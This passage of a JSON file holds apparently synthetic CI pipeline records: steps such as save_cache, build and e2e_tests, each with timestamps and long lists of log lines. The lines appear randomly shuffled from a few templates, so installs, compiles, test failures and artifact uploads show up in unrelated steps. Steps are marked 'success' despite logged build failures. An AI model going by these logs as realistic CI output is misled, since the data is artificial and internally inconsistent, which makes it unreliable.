          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_db_connect (42ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing webpack@3.0.0",
          "\u2713 test completed",
          "\u2717 build failed with exit code 75",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (483ms)",
          "\u2713 build completed",
          "[12:00:18] ERROR: Connection failed",
          "Installing webpack@2.10.0",
          "Cache hit for key-3841",
          "Cache hit for key-5933",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 2/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "  PASS: test_user_create (372ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "Installing lodash@5.6.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-5747",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_auth_login (14ms)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "Cache hit for key-7298",
          "  PASS: test_cache_hit (342ms)",
          "Cache hit for key-1103",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_api_health (379ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 2/10: Building",
          "  PASS: test_api_health (339ms)",
          "Cache hit for key-6725",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@2.18.0",
          "  PASS: test_db_connect (257ms)",
          "  PASS: test_api_health (493ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing express@3.2.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Exception: TypeError",
          "Installing axios@1.4.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-1329",
          "  PASS: test_user_create (108ms)",
          "[12:00:18] ERROR: Connection failed",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing webpack@2.0.0",
          "Exception: TypeError",
          "Cache hit for key-9924",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Cache hit for key-9125",
          "Installing lodash@4.2.0",
          "Cache hit for key-8456",
          "Cache hit for key-7864",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_api_health (485ms)",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing prettier@1.11.0",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-5226",
          "Compiling src/index.js...",
          "Cache hit for key-8920",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1652",
          "Step 6/10: Building",
          "Cache hit for key-2141",
          "Installing webpack@5.16.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing jest@1.2.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing axios@3.6.0",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/service.java...",
          "Cache hit for key-8340",
          "FAILED: test_user_create",
          "Step 9/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (35ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing axios@1.15.0",
          "  PASS: test_db_connect (488ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "Installing axios@4.20.0",
          "Step 8/10: Building",
          "  PASS: test_db_connect (420ms)",
          "  PASS: test_auth_login (334ms)",
          "Installing express@5.16.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "WARNING: jest has known vulnerabilities",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-4541",
          "Compiling src/index.js...",
          "  PASS: test_user_create (96ms)",
          "Compiling src/handler.rs...",
          "Installing webpack@2.1.0",
          "Cache hit for key-4429",
          "Installing webpack@2.7.0",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@2.2.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing webpack@2.18.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-3119",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-22T12:00:40.419954",
        "finished_at": "2025-11-22T12:00:43.414126",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Installing jest@4.12.0",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-6016",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (374ms)",
          "  PASS: test_cache_hit (497ms)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Cache hit for key-7721",
          "  PASS: test_auth_login (196ms)",
          "  PASS: test_auth_login (304ms)",
          "FAILED: test_user_create",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (458ms)",
          "Installing eslint@2.6.0",
          "  PASS: test_cache_hit (315ms)",
          "[12:00:18] INFO: Processing request",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-8630",
          "Cache hit for key-8439",
          "Installing jest@1.0.0",
          "Cache hit for key-1811",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (256ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing eslint@3.12.0",
          "Step 1/10: Building",
          "  PASS: test_db_connect (243ms)",
          "Installing jest@3.10.0",
          "Step 7/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-6324",
          "Cache hit for key-3271",
          "Compiling src/main.py...",
          "Cache hit for key-2951",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (318ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-7499",
          "  PASS: test_db_connect (460ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Installing react@3.9.0",
          "Step 6/10: Building",
          "  PASS: test_auth_login (430ms)",
          "\u2713 build completed",
          "  PASS: test_db_connect (262ms)",
          "Installing eslint@3.5.0",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "Cache hit for key-5323",
          "Installing webpack@1.4.0",
          "  PASS: test_cache_hit (51ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing express@5.11.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (29ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 lint completed",
          "Installing prettier@2.9.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 1/10: Building",
          "Installing jest@1.0.0",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing jest@5.13.0",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_api_health (182ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-4260",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (119ms)",
          "Cache hit for key-4997",
          "\u2713 test completed",
          "  PASS: test_db_connect (260ms)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (95ms)",
          "Installing react@5.16.0",
          "Cache hit for key-3651",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 test completed",
          "\u2713 test completed",
          "  PASS: test_api_health (198ms)",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Cache hit for key-2795",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-7362",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-2955",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:18] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 build completed",
          "Installing lodash@5.2.0",
          "\u2713 test completed",
          "  PASS: test_auth_login (54ms)",
          "Cache hit for key-5714",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Cache hit for key-1677",
          "FAILED: test_auth_login",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1392",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing eslint@1.14.0",
          "Cache hit for key-9125",
          "Installing eslint@4.4.0",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing prettier@2.13.0",
          "  PASS: test_api_health (157ms)",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (426ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing axios@3.20.0",
          "Step 2/10: Building",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing react@5.10.0",
          "Step 6/10: Building",
          "Installing prettier@5.1.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (4ms)",
          "Step 5/10: Building",
          "  PASS: test_auth_login (495ms)",
          "WARNING: prettier has known vulnerabilities",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "Installing express@1.5.0",
          "Exception: TypeError",
          "Compiling src/handler.rs...",
          "Installing webpack@1.1.0",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (167ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_user_create (461ms)",
          "Cache hit for key-3126",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_db_connect (87ms)",
          "  PASS: test_api_health (466ms)",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-22T12:00:43.414126",
        "finished_at": "2025-11-22T12:00:58.384986",
        "log_lines": [
          "=== Step: build ===",
          "Cache hit for key-5696",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Cache hit for key-9222",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "  PASS: test_db_connect (170ms)",
          "Compiling src/utils.go...",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "Cache hit for key-5322",
          "Step 1/10: Building",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4754",
          "  PASS: test_api_health (172ms)",
          "\u2713 build completed",
          "Cache hit for key-7034",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@4.16.0",
          "Compiling src/handler.rs...",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-8911",
          "  PASS: test_db_connect (337ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Installing express@5.1.0",
          "Step 6/10: Building",
          "Step 2/10: Building",
          "Cache hit for key-2240",
          "Cache hit for key-2875",
          "Installing webpack@3.18.0",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] ERROR: Connection failed",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Installing jest@5.4.0",
          "Step 3/10: Building",
          "Cache hit for key-1338",
          "Installing jest@2.16.0",
          "Installing axios@3.7.0",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (390ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (93ms)",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Installing react@2.3.0",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Cache hit for key-1495",
          "Cache hit for key-9950",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (89ms)",
          "[12:00:18] ERROR: Connection failed",
          "FAILED: test_api_health",
          "Compiling src/index.js...",
          "Installing eslint@5.8.0",
          "  PASS: test_db_connect (21ms)",
          "WARNING: express has known vulnerabilities",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (257ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "\u2713 test completed",
          "FAILED: test_auth_login",
          "  PASS: test_auth_login (85ms)",
          "Compiling src/service.java...",
          "Installing axios@2.20.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (77ms)",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-8233",
          "  PASS: test_api_health (407ms)",
          "\u2713 test completed",
          "Cache hit for key-6558",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4131",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-2035",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Cache hit for key-8152",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (303ms)",
          "Cache hit for key-8856",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 8/10: Building",
          "  PASS: test_user_create (80ms)",
          "Exception: NullPointerException",
          "\u2713 test completed",
          "  PASS: test_db_connect (24ms)",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing eslint@3.8.0",
          "  PASS: test_api_health (110ms)",
          "\u2713 test completed",
          "  PASS: test_auth_login (381ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_cache_hit (225ms)",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Installing react@4.7.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5921",
          "Step 6/10: Building",
          "  PASS: test_api_health (373ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1228",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (324ms)",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 lint completed",
          "  PASS: test_user_create (385ms)",
          "  PASS: test_api_health (462ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "Installing jest@3.7.0",
          "Step 7/10: Building",
          "Cache hit for key-2449",
          "Installing webpack@2.5.0",
          "  PASS: test_db_connect (50ms)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (375ms)",
          "Cache hit for key-3088",
          "Step 5/10: Building",
          "  PASS: test_api_health (369ms)",
          "Cache hit for key-2925",
          "Installing express@1.10.0",
          "WARNING: eslint has known vulnerabilities",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-7963",
          "[12:00:18] INFO: Processing request",
          "Installing jest@4.16.0",
          "  PASS: test_db_connect (104ms)",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (4ms)",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "Installing react@5.8.0",
          "Cache hit for key-8782",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-22T12:00:58.384986",
        "finished_at": "2025-11-22T12:01:13.355846",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Installing webpack@1.15.0",
          "  PASS: test_api_health (56ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 1/10: Building",
          "Cache hit for key-2284",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing eslint@1.17.0",
          "Cache hit for key-8339",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing react@4.15.0",
          "  PASS: test_cache_hit (454ms)",
          "\u2713 build completed",
          "Installing react@2.8.0",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Installing lodash@2.0.0",
          "Cache hit for key-1293",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4327",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2717 build failed with exit code 61",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing axios@1.12.0",
          "Installing prettier@1.16.0",
          "Cache hit for key-8304",
          "Compiling src/index.js...",
          "Exception: RuntimeError",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_cache_hit (395ms)",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (343ms)",
          "Cache hit for key-5385",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-6308",
          "Cache hit for key-1801",
          "Installing prettier@4.0.0",
          "  PASS: test_cache_hit (300ms)",
          "  PASS: test_user_create (488ms)",
          "  PASS: test_auth_login (368ms)",
          "Cache hit for key-4012",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Installing axios@3.6.0",
          "Step 9/10: Building",
          "Installing lodash@3.9.0",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-5277",
          "[12:00:18] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-9689",
          "Cache hit for key-1527",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2717 build failed with exit code 122",
          "Step 2/10: Building",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing react@1.16.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4873",
          "Compiling src/app.ts...",
          "Step 6/10: Building",
          "Installing lodash@4.5.0",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing jest@1.1.0",
          "  PASS: test_auth_login (307ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing webpack@5.6.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing axios@5.16.0",
          "  PASS: test_cache_hit (302ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Installing lodash@1.9.0",
          "  PASS: test_user_create (249ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (493ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (117ms)",
          "\u2713 test completed",
          "Cache hit for key-4132",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-2828",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9462",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 8/10: Building",
          "Cache hit for key-5027",
          "Compiling src/main.py...",
          "Cache hit for key-6378",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_api_health (164ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 7/10: Building",
          "Compiling src/utils.go...",
          "Installing express@4.19.0",
          "Installing react@1.19.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing react@3.4.0",
          "Cache hit for key-2526",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@2.5.0",
          "  PASS: test_user_create (155ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing axios@3.15.0",
          "Cache hit for key-1296",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8754",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing prettier@2.16.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing axios@1.18.0",
          "Step 5/10: Building",
          "Installing prettier@1.5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing lodash@1.12.0",
          "[12:00:18] INFO: Processing request",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (269ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-1347",
          "Installing react@4.17.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing react@2.20.0",
          "WARNING: lodash has known vulnerabilities",
          "Installing axios@5.16.0",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-4789",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-22T12:01:13.355846",
        "finished_at": "2025-11-22T12:01:18.346133",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Installing axios@3.8.0",
          "\u2713 build completed",
          "Installing jest@5.20.0",
          "Step 1/10: Building",
          "Installing eslint@5.10.0",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/app.ts...",
          "Cache hit for key-8718",
          "\u2713 test completed",
          "  PASS: test_db_connect (250ms)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (88ms)",
          "[12:00:18] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (283ms)",
          "Exception: RuntimeError",
          "Installing webpack@4.4.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-7428",
          "\u2713 lint completed",
          "Cache hit for key-3061",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "  PASS: test_user_create (383ms)",
          "Step 7/10: Building",
          "Cache hit for key-6892",
          "  PASS: test_cache_hit (500ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "Installing jest@1.3.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-5355",
          "Compiling src/index.js...",
          "Cache hit for key-4768",
          "\u2713 lint completed",
          "Installing jest@3.12.0",
          "  PASS: test_db_connect (243ms)",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-2457",
          "Installing prettier@1.2.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (392ms)",
          "[12:00:18] INFO: Processing request",
          "Installing axios@3.19.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (454ms)",
          "Compiling src/service.java...",
          "Installing webpack@3.8.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 lint completed",
          "Cache hit for key-1407",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Cache hit for key-8222",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/service.java...",
          "[12:00:18] WARN: Deprecated API usage",
          "FAILED: test_auth_login",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:18] INFO: Processing request",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-1704",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_cache_hit (340ms)",
          "Step 8/10: Building",
          "  PASS: test_user_create (343ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-8309",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Installing webpack@1.8.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_api_health (276ms)",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (138ms)",
          "Cache hit for key-3704",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing jest@5.15.0",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Installing webpack@4.1.0",
          "  PASS: test_auth_login (460ms)",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@1.12.0",
          "Step 4/10: Building",
          "Installing express@1.20.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 5/10: Building",
